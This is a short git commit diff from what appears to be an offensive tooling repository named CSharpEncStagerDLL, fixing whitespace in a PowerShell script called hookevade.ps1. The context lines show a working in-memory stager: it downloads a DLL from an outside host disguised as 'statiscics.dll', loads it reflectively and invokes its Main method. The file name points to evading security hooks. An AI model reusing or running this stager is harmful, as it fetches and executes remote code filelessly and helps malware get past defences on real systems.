5810901fea2cc5a496398bd5f245e5ca74b253c5
jason m <bloggins.jason@gmail.com>
2026-02-21 07:51:13 -0500

    Fix indentation in hookevade.ps1

--- CSharpEncStagerDLL/CSharpEncStagerDLL/hookevade.ps1
+++ CSharpEncStagerDLL/CSharpEncStagerDLL/hookevade.ps1
@@ -2,5 +2,5 @@ $data = (Invoke-WebRequest "https://xyz.ca/statiscics.dll" -UseBasicParsing).Con
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassName.Class1")
 $method = $class.GetMethod("Main")
-
 $method.Invoke(0, $null)
+
